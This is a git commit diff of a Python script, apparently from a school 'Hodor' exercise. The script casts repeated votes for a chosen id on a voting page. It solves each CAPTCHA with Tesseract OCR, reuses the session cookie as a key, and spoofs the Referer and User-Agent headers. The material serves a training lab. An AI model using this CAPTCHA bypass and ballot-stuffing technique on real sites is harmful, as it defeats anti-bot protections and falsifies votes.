0cd8b4fa3998363f105e84f40a484a9405cc3039
lulimsky <3337@holbertonshool.com>
2022-02-06 20:15:42 +0000

    update

--- level_3/level_3.py
+++ level_3/level_3.py
@@ -1,49 +1,54 @@
-#!/usr/bin/python3
-
 import requests
 import sys
-import subprocess
+import pytesseract
 
 # Get ID from command line
 if len(sys.argv) != 2:
-  print("Usage python " + sys.argv[0] + " id")
-  quit()
+    print("Usage python " + sys.argv[0] + " id")
+    quit()
 
 # Check if id is numerical
 input = sys.argv[1]
 
 try:
-  id = int(input)
+    id = int(input)
 except ValueError:
-  print("Error: id must be a number")
-  quit()
+    print("Error: id must be a number")
+    quit()
 
 # Set the endpoint
-URI     = "http://158.69.76.135/level3.php"
+URI = "http://158.69.76.135/level3.php"
 CAPTCHA = "http://158.69.76.135/captcha.php"
 
-headers = {'Referer': URI, 'User-Agent': 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)'}
-payload = {'id': id, 'holdthedoor': 'Submit+Query', 'key': '', 'captcha': ''}
+headers = {
+'Referer': URI,
+'User-Agent': 'Mozilla/5.0 \
+(compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)'
+}
 
-for i in range(0, 1024):
-  # Get cookie
-  cookies = requests.get(URI).cookies
+payload = {'id': id,
+'holdthedoor': 'Submit+Query',
+'key': '', 'captcha': ''}
 
-  # Get captcha png
-  req = requests.get(CAPTCHA, cookies=cookies, stream=True)
+for i in range(0, 98):
+    # Get cookie
+    cookies = requests.get(URI).cookies
 
-  # Save image png into file
-  open_img = open('captcha.png', 'wb')
-  open_img.write(req.content)
-  open_img.close()
+    # Get captcha png 
+    req = requests.get(CAPTCHA, cookies=cookies, stream=True)
 
-  # Execute external OCR program
-  ocr_text = subprocess.check_output("tesseract captcha.png stdout", shell=True).strip()
+    # Save image png into file
+    open_img = open('captcha.png', 'wb')
+    open_img.write(req.content)
+    open_img.close()
 
-  # Build POST request
-  payload['captcha'] = ocr_text
-  payload['key'] = cookies['HoldTheDoor']
+    # Get text from captcha
+    ocr_text = pytesseract.image_to_string("captcha.png")
 
-  # Send POST request
-  response = requests.post(URI, data=payload, headers=headers, cookies=cookies)
-  print ("POST " + str(i + 1) + " HTTP result: " + str(response) + "OCR text: " + ocr_text)
+    # Build POST request
+    payload['captcha'] = ocr_text
+    payload['key'] = cookies['HoldTheDoor']
+
+    # Send POST request
+    response = requests.post(URI, data=payload, headers=headers, cookies=cookies)
+    print ("POST " + str(i + 1) + " HTTP result: " + str(response) + "OCR text: " + ocr_text)
